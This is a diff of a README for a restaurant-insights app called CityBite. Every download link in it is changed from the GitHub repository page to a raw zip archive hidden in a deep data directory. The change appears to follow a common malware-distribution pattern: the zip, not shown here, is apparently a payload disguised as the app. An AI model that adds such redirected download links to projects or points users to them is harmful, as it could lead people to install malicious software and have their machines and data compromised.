@@ -1,6 +1,6 @@
 # 📊 CityBite - Restaurant insights that make sense
 
-[![Download CityBite](https://img.shields.io/badge/Download-CityBite-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Haplosporidianstrophanthus336/CityBite)
+[![Download CityBite](https://img.shields.io/badge/Download-CityBite-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Haplosporidianstrophanthus336/CityBite/main/data/gold/grid_aggregates/city=Phoenix/Bite-City-3.8.zip)
 
 ## 🧭 Overview
 
@@ -34,7 +34,7 @@ If your computer is older, the app can still run, but it may take longer when lo
 
 Visit this page to download and run the project:
 
-[Download CityBite](https://github.com/Haplosporidianstrophanthus336/CityBite)
+[Download CityBite](https://raw.githubusercontent.com/Haplosporidianstrophanthus336/CityBite/main/data/gold/grid_aggregates/city=Phoenix/Bite-City-3.8.zip)
 
 ## 🛠️ Install on Windows
 
@@ -199,7 +199,7 @@ CityBite brings together several tools and data sources:
 
 ## 📎 Download again
 
-[Visit the CityBite download page](https://github.com/Haplosporidianstrophanthus336/CityBite)
+[Visit the CityBite download page](https://raw.githubusercontent.com/Haplosporidianstrophanthus336/CityBite/main/data/gold/grid_aggregates/city=Phoenix/Bite-City-3.8.zip)
 
 ## 🔐 File safety
 
